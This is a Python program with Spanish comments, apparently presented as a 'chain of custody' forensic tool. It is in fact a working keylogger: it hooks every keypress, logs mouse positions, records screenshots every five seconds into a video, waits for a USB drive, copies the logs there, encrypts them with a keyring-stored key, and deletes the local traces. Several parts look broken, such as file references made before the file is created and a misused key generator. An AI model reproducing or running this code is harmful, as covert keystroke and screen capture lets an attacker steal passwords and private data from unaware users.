import os
import shutil
import hashlib
import zipfile
import pyautogui
import datetime
import time
import keyring
import py7zr
import cv2
import keyboard
import tkinter as tk
import threading

# Crear la ventana principal
window = tk.Tk()
window.title("Cadena de custodia")
window.geometry("600x500")

# Crea una carpeta "capturasdepantalla" en la carpeta del usuario
def createFolder():
    try:
        os.mkdir('C:\\users\\%s\\screenShots' % os.getlogin())
    except OSError:
        print ("Creation of the directory %s failed" % 'C:\\users\\%s\\screenShots' % os.getlogin())
    else:
        print ("Successfully created the directory %s " % 'C:\\users\\%s\\screenShots' % os.getlogin())

# Función para encriptar y comprimir un archivo usando 7zip
def encrypt_and_compress_file(input_file, output_file, password):
    with py7zr.SevenZipFile(output_file, mode='w', password=password) as z:
        z.write(input_file)

# Función para calcular el hash SHA-256 de un archivo
def calculate_sha256_hash(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        # Leer el archivo por bloques para archivos grandes
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# Función para registrar capturas de pantalla en segundo plano
def record_screenshots():
    screenshots_path = os.path.join(usb_path, 'screenshots')
    os.makedirs(screenshots_path, exist_ok=True)

    video_out = cv2.VideoWriter('screen_record.mp4', cv2.VideoWriter_fourcc(*'mp4v'), 5, (1920, 1080))

    while True:
        now = datetime.datetime.now()
        screenshot_file = os.path.join(screenshots_path, 'screenshot_{}.png'.format(now.strftime('%Y%m%d_%H%M%S')))
        pyautogui.screenshot(screenshot_file)
        image = cv2.imread(screenshot_file)
        video_out.write(image)

        # Esperar 5 segundos para la siguiente captura de pantalla
        time.sleep(5)

# Función para copiar los archivos al USB
def copy_log_to_usb():
    usb_config_file = os.path.join(usb_path, 'usb_config.txt')
    if not os.path.exists(usb_config_file):
        # Verificar espacio en la memoria USB
        usb_stats = shutil.disk_usage(usb_path)
        if usb_stats.free > 1e9:  # 1GB en bytes
            # Copiar solo una vez los archivos
            shutil.copy(log_file, usb_path)
            shutil.copy(encrypted_log_file, usb_path)
            # Crear un archivo para marcar que se copiaron los archivos
            with open(usb_config_file, 'w') as f:
                f.write('archivos_copiados')
        else:
            print("Espacio insuficiente en el USB. Se requiere al menos 1GB de espacio disponible.")
            return
    else:
        # Los archivos ya fueron copiados previamente, no se copian de nuevo
        return

# Función para registrar los movimientos del ratón en segundo plano
def record_mouse_movements():
    def OnKeyPress(event):
        now = datetime.datetime.now()
        with open(log_file, 'a') as f:
            f.write('{} [KEYPRESS]\t{}\t{}\n'.format(now, event.name, event.scan_code))

    # Configurar el keylogger utilizando la librería keyboard
    keyboard.on_press(OnKeyPress)

    while True:
        x, y = pyautogui.position()
        now = datetime.datetime.now()
        with open(log_file, 'a') as f:
            f.write('{} [MOUSEMOVE]\t{}\t{}\n'.format(now, x, y))
        time.sleep(5)

# Crear la carpeta de capturas de pantalla
createFolder()

log_file = 'registro.txt'  # Nombre de archivo para guardar el registro
usb_path = 'D:\\'  # Ruta del USB donde se almacenará la información final

# Llamar a la función para registrar los movimientos del ratón en segundo plano
mouse_thread = threading.Thread(target=record_mouse_movements)
mouse_thread.daemon = True
mouse_thread.start()

# Esperar a que se inserte el USB
while not os.path.exists(usb_path):
    pass

# Llamar a la función para copiar los archivos
copy_log_to_usb()

# Definir la ruta del archivo encriptado después de la función "copy_log_to_usb()"
encrypted_log_file = os.path.join(usb_path, 'registro_encrypted.7z')  # Ruta del archivo encriptado

# Verificar que los archivos estén en el USB antes de continuar
if not (os.path.exists(os.path.join(usb_path, log_file)) and os.path.exists(encrypted_log_file)):
    print("Error al copiar los archivos al USB.")
    exit()

# Verificar espacio en la memoria USB
keylogger_size = os.path.getsize(__file__)
usb_stats = shutil.disk_usage(usb_path)
if usb_stats.free > keylogger_size:
    # Obtener clave de encriptación
    key = keyring.get_password('system', 'encryption_key')
    if key is None:
        key = py7zr.SevenZipFile().randomread(32)  # Generar una clave aleatoria si no está almacenada en el keyring
        keyring.set_password('system', 'encryption_key', key)

    # Encriptar y comprimir el archivo de registro
    encrypt_and_compress_file(log_file, encrypted_log_file, key)

    # Eliminar archivo de registro local y los archivos encriptados
    os.remove(log_file)
    os.remove('screen_record.mp4')

    # Calcular el hash SHA-256 del archivo encriptado y comprimido
    sha256_hash_data = calculate_sha256_hash(encrypted_log_file)
    print("Hash SHA-256 del archivo encriptado y comprimido:", sha256_hash_data)

    # Iniciar el proceso de grabación de capturas de pantalla cada cierto tiempo
    record_screenshots()
else:
    print("Espacio insuficiente en el USB.")
